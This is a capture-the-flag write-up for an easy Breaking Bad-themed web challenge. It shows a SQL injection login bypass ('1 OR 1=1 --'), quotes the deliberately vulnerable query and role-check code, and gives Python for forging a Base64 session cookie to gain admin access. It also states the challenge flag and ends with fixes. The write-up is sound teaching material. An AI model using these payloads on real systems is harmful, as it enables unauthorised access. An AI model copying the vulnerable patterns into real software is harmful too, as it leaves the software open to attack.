---
title: Hermanos
difficulty: Easy
points: 100
categories: [Web Exploitation]
tags: []

flag: CYS{legacy_session_7f91c2e8}
---

Hermanos

Author: S.Pragyah

This is a web exploitation CTF challenge based on the Los Pollos Hermanos universe from Breaking Bad. The objective is to gain administrative access to the Los Pollos Hermanos management console and retrieve the flag.

The intended attack chain is:

SQL Injection → Dashboard Access → Session Cookie Analysis → Base64 Decode → Role Manipulation → Admin Access → Flag

Firstly, we access the login page.

The application asks for an Employee ID and Password. A normal set of credentials available within the challenge is:

Employee ID: 1  
Password: heisenberg

After analysing the application's behaviour, we can identify that the Employee ID input is vulnerable to SQL Injection.

The backend constructs its SQL query by directly concatenating user-controlled input:

```python
query = f"""
SELECT * FROM users
WHERE id = {employee_id}
AND password = '{password}'
"""
```

Since the Employee ID is inserted directly into the SQL query without parameterized statements, we can manipulate the query.

We use the following payload:

```text
Employee ID: 1 OR 1=1 --
Password: anything
```

The resulting SQL query becomes:

```sql
SELECT * FROM users
WHERE id = 1 OR 1=1 --
AND password = 'anything'
```

The `--` sequence comments out the remaining password condition. Since `1=1` is always true, the application returns a valid user and allows us to access the dashboard.

After successfully logging in, we are redirected to:

```text
/dashboard
```

Next, we inspect the browser's `session` cookie.

The cookie initially appears as an encoded string. However, after decoding it from Base64, we can see that it contains JSON data.

We can decode the session cookie using Python:

```python
import base64

cookie = "PASTE_COOKIE_HERE"
print(base64.b64decode(cookie).decode())
```

The decoded session data has the following structure:

```json
{"user":"walter","role":"employee","session_version":1}
```

This reveals the second vulnerability in the application.

The user's authorization role is stored entirely inside a client-controlled cookie. Furthermore, the cookie is only Base64 encoded. Base64 is an encoding mechanism and does not provide encryption or integrity protection.

Therefore, we can modify the value of the `role` field from `employee` to `admin`.

We create the following JSON object:

```json
{"user":"walter","role":"admin","session_version":1}
```

We then encode it back into Base64 using:

```python
import base64
import json

data = {
    "user": "walter",
    "role": "admin",
    "session_version": 1
}

print(base64.b64encode(json.dumps(data).encode()).decode())
```

After generating the modified Base64 value, we replace the existing `session` cookie in the browser with our newly forged cookie.

We can then visit the administrator endpoint:

```text
/admin
```

The application checks the `role` value from the cookie:

```python
if session_data.get('role') != 'admin':
    return '<h1>403 Forbidden</h1><p>Administrative privileges required.</p>', 403
```

Since our modified session now contains:

```text
role: admin
```

the authorization check is bypassed and we gain access to the Los Pollos Hermanos administrator console.

The flag is displayed on the admin page:

```text
CYS{legacy_session_7f91c2e8}
```

The challenge contains two main vulnerabilities.

SQL Injection:

The application directly concatenates user-controlled input into an SQL query. This allows an attacker to alter the intended query logic and bypass authentication. In a real-world application, parameterized queries or prepared statements should always be used.

Client-Controlled Authorization:

The application stores the user's authorization role inside a Base64-encoded cookie and trusts that value when checking access to the administrator page. Since Base64 provides no cryptographic protection, an attacker can decode, modify, and re-encode the session data. Authorization decisions should instead be maintained server-side or protected using a properly signed and verified session mechanism.

The complete exploitation chain is therefore:

```text
1. Access the Los Pollos Hermanos login page.
2. Exploit SQL Injection using: 1 OR 1=1 --
3. Gain access to the dashboard.
4. Inspect and extract the session cookie.
5. Base64-decode the cookie.
6. Change role from employee to admin.
7. Base64-encode the modified JSON data.
8. Replace the original session cookie.
9. Visit /admin.
10. Retrieve the flag.
```
